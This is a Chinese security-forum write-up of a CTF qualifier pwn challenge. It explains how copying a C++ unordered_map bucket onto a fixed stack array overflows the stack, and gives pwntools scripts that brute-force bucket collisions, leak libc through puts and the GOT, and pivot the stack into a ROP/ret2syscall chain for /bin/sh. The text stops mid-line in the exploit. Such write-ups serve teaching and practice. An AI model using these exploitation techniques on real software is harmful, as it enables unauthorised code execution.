---
title: CCBCISCN初赛Pwn部分题解
url: https://forum.butian.net/share/4364
source: 奇安信攻防社区
date: 2025-05-31
fetch_date: 2025-10-06T22:23:41.514746
---

# CCBCISCN初赛Pwn部分题解

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### CCBCISCN初赛Pwn部分题解

CCBCISCN初赛Pwn部分题解

novel1
======
bucket相关知识
----------
在C++中，\*\*`bucket`\*\* 通常与哈希表（Hash Table）或无序容器（如 `std::unordered\_map` 和 `std::unordered\_set`）相关。它表示哈希表中的一个存储单元，用于存储具有相同哈希值的元素。
### 1. \*\*哈希表的基本概念\*\*
哈希表是一种数据结构，它通过哈希函数将键（key）映射到一个索引（bucket），然后将值存储在该索引对应的位置。哈希表的核心思想是通过哈希函数将键均匀分布到不同的桶（bucket）中，以实现高效的查找、插入和删除操作。
### 2. \*\*`bucket` 的作用\*\*
- \*\*`bucket`\*\* 是哈希表中的一个存储单元，通常是一个链表或其他容器（如数组或向量），用于存储具有相同哈希值的元素。
- 当多个键通过哈希函数映射到同一个索引时，这些键值对会被存储在同一个 `bucket` 中（这种情况称为哈希冲突）。
- 哈希表的性能与 `bucket` 的数量和分布密切相关。如果哈希函数设计得好，元素会均匀分布在各个 `bucket` 中，从而减少冲突，提高性能。
### 3. \*\*C++ 中的 `bucket` 相关操作\*\*
在 C++ 标准库中，`std::unordered\_map` 和 `std::unordered\_set` 是基于哈希表实现的容器。它们提供了与 `bucket` 相关的成员函数，例如：
- \*\*`bucket\_count()`\*\*: 返回哈希表中 `bucket` 的总数。
- \*\*`bucket\_size(n)`\*\*: 返回第 `n` 个 `bucket` 中的元素数量。
- \*\*`bucket(key)`\*\*: 返回键 `key` 所在的 `bucket` 的索引。
- \*\*`load\_factor()`\*\*: 返回哈希表的负载因子（即每个 `bucket` 的平均元素数量）。
- \*\*`max\_load\_factor()`\*\*: 返回或设置哈希表的最大负载因子。
### 4. \*\*示例代码\*\*
以下是一个使用 `std::unordered\_map` 并操作 `bucket` 的示例：
```c++
#include <iostream>
#include <unordered\_map>
int main() {
// 创建一个 unordered\_map
std::unordered\_map<std::string, int> myMap = {
{"apple", 1},
{"banana", 2},
{"cherry", 3},
{"date", 4},
{"elderberry", 5}
};
// 输出 bucket 的总数
std::cout << "Bucket count: " << myMap.bucket\_count() << std::endl;
// 输出每个 bucket 中的元素数量
for (size\_t i = 0; i < myMap.bucket\_count(); ++i) {
std::cout << "Bucket " << i << " has " << myMap.bucket\_size(i) << " elements." << std::endl;
}
// 输出某个键所在的 bucket
std::string key = "banana";
std::cout << "Key '" << key << "' is in bucket " << myMap.bucket(key) << std::endl;
// 输出负载因子
std::cout << "Load factor: " << myMap.load\_factor() << std::endl;
std::cout << "Max load factor: " << myMap.max\_load\_factor() << std::endl;
return 0;
}
```
### 5. \*\*总结\*\*
- \*\*`bucket`\*\* 是哈希表中的一个存储单元，用于存储具有相同哈希值的元素。
- 在 C++ 中，`std::unordered\_map` 和 `std::unordered\_set` 提供了与 `bucket` 相关的操作函数，可以用于调试和优化哈希表的性能。
- 理解 `bucket` 的概念对于设计高效的哈希表和解决哈希冲突非常重要。
题目分析
----
libc2.35 Partial RELRO,no canary,no pie，\*\*看到no canary首先想到这个题是不是栈溢出\*\*
main函数非常简单
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-c6fc9dec3afcdb36c6c94e3820bd7c66b9114fb1.png)
part1函数
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-e3e81e9bb4635079cb43407c7176be57cea0a03b.png)
fragment函数功能就是打印传入的字符串
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-954be5fc46189fa40c27149749e28967b2fecdff.png)
part2函数
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-e05c02e3154eebdd70d901ba2a39f9b3303f7201.png)
RACHE函数
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-5c41f399988b110d1136d7b6e82c42b44b2952dd.png)
### 1. \*\*`std::copy` 的作用\*\*
`std::copy` 是 C++ 标准库中的一个算法函数，用于将一个范围内的元素从源容器复制到目标容器。它的函数原型如下：
```c++
template<class InputIterator, class OutputIterator>
OutputIterator copy(InputIterator first, InputIterator last, OutputIterator result);
```
- \*\*`first` 和 `last`\*\*: 定义了源容器的范围（`[first, last)`）。
- \*\*`result`\*\*: 目标容器的起始位置，复制的结果将从这里开始存储。
### 2. \*\*代码中的 `std::copy`\*\*
在代码中，`std::copy` 的调用如下：
```c++
std::copy<std::\_\_detail::\_Local\_iterator<unsigned int,std::pair<unsigned int const,unsigned long>,std::\_\_detail::\_Select1st,std::hash<unsigned int>,std::\_\_detail::\_Mod\_range\_hashing,std::\_\_detail::\_Default\_ranged\_hash,false,false>,std::pair\*<unsigned int,unsigned long>>(
begin,
end,
v3);
```
\*\*参数解析：\*\*
- \*\*`begin` 和 `end`\*\*:
- 这两个参数是迭代器，表示哈希表中某个 `bucket` 的起始和结束位置。
- `begin` 是 `std::unordered\_map` 中某个 `bucket` 的起始迭代器。
- `end` 是 `std::unordered\_map` 中某个 `bucket` 的结束迭代器。
- 它们是通过 `std::unordered\_map::begin(bucket\_index)` 和 `std::unordered\_map::end(bucket\_index)` 获取的。
- \*\*`v3`\*\*:
- 这是一个数组（`\_DWORD v3[39]`），用于存储从 `bucket` 中复制的元素。
- `v3` 是目标容器的起始位置，复制的结果将存储在这里。 #### 功能：
- 将哈希表中某个 `bucket` 中的所有键值对（`std::pair<unsigned int, unsigned long>`）复制到数组 `v3` 中。
### 3. \*\*代码的上下文\*\*
这段代码的功能是：
1. 用户输入一个键（`idx`），程序在哈希表 `bloodstains` 中查找该键。
2. 如果键不存在，输出错误信息。
3. 如果键存在，找到该键所在的 `bucket`，并获取该 `bucket` 的大小（`bucketSize`）。
4. 使用 `std::copy` 将该 `bucket` 中的所有键值对复制到数组 `v3` 中。
5. 遍历 `v3`，输出所有相似的键值对。
EXP编写
-----
\*\*需要注意的是，这个copy函数只会把同一个bucket内的东西复制到栈上，因此需要找哪些idx被映射到同一个bucket中。但注意到part2函数给了一个打印同一个bucket的循环，因此可以利用这个测出哪些Idx在同一个bucket\*\*
- \*\*`idx` 的循环周期\*\*
如果 `idx` 是一个连续递增的整数（例如 `0, 1, 2, 3, ...`），那么它们是否会被放在同一个 `bucket` 中，取决于以下条件：
- \*\*如果 `bucket\_count()` 是固定的\*\*：
- 由于 `bucket\_index = idx % bucket\_count()`，`idx` 的值每增加 `bucket\_count()`，`bucket\_index` 就会循环一次。
- 例如，如果 `bucket\_count() = 10`，那么 `idx = 0, 10, 20, ...` 会被放在同一个 `bucket` 中。
- \*\*如果 `bucket\_count()` 是动态变化的\*\*：
- `std::unordered\_map` 会根据负载因子（`load\_factor`）动态调整桶的数量。
- 当桶的数量变化时，`bucket\_index` 的计算方式也会变化，因此 `idx` 的循环周期也会变化。
\*\*因此写出以下exp来爆破如何在同一个bucket中\*\*
```python
for j in range(1,100):
p = process("/home/zp9080/PWN/novel1")
p.sendlineafter('Author: ',b'a')
for i in range(0x1f):
part1(i\*j,10)
part2(j)
p.recvuntil('as follows:')
p.recvline()
p.recvline()
data=p.recvline()
if(data !=b'\n'):
print(j)
pause()
```
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-4a25929dc8c34b5602b347e4dbeea47015264067.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-34364d4f987bc33936b6d963c69ed021c9d8a730.png)
\*\*剩下的就是构造exp了，一开始author让我们输入0x80字节长度的数据（一种栈迁移的提示），同时这个magic\\_gadget可以控制rsp,显然的栈迁移。\*\*
\*\*但注意到这个copy不是按照idx顺序来的，比如59,59\\*2顺序，但是通过调试看栈上的数据排布可以得出每个idx对应复制到栈上的哪个位置。\*\*
\*\*剩下的exp构造就很简单了，只是要注意不要直接用system函数，因为这个函数调用时会降低rsp，会降低0x600左右，因为rsp此时指向bss，再往下降就降到了不可写的段，而system需要往rsp上写东西，此时就会崩掉。因此直接用ret2syscall就可以了\*\*
```python
from pwnlib.util.packing import u64
from pwnlib.util.packing import u32
from pwnlib.util.packing import u16
from pwnlib.util.packing import u8
from pwnlib.util.packing import p64
from pwnlib.util.packing import p32
from pwnlib.util.packing import p16
from pwnlib.util.packing import p8
from pwn import \*
from ctypes import \*
context(os='linux', arch='amd64', log\_level='debug')
p = process("/home/zp9080/PWN/novel1")
# p=gdb.debug("/home/zp9080/PWN/pwn",'b \*$rebase(0x117F)')
# p=remote('139.155.126.78',31415)
# p=process(['seccomp-tools','dump','/home/zp9080/PWN/pwn'])
elf = ELF("/home/zp9080/PWN/novel1")
libc=elf.libc
gdb\_script='''
b \*0x402CCF
'''
def dbg():
gdb.attach(p,gdb\_script)
pause()
menu=b'Chapter: '
def part1(idx,value):
p.sendlineafter(menu,str(1))
p.sendlineafter('Blood:',str(idx))
p.sendlineafter('Evidence:',str(value))
def part2(idx):
p.sendlineafter(menu,str(2))
p.sendlineafter('Blood:',str(idx))
pop\_rdi\_rbp=0x4025C0
pop\_rsi\_rbp=0x40494e
puts\_got=elf.got['puts']
puts=elf.plt['puts']
author=0x40A540-0x10
magic=0x4025BE
my\_gets=0x40283C #read(0,author,0x80)
payload=p64(pop\_rdi\_rbp)+p64(puts\_got)+p64(0)+p64(puts)
payload+=p64(my\_gets)+p64(0)+p64(my\_gets)+p64(0)
p.sendlineafter('Author:',payload)
for i in range(19):
part1(59\*i,10)
part1(59\*19,magic)
part1(59\*20,author)
for i in range(21,30):
part1(59\*i,10)
# dbg()
part2(59)
libcbase=u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))-libc.sym['puts']
print(hex(libcbase))
rdi = libcbase + 0x2a3e5
rsi = libcbase + 0x2be51
rdx\_rbx = libcbase + 0x904a9
rax = libcbase + 0x45eb0
bin\_addr = libcbase + next(libc.search(b'/bin/sh'))
syscall=...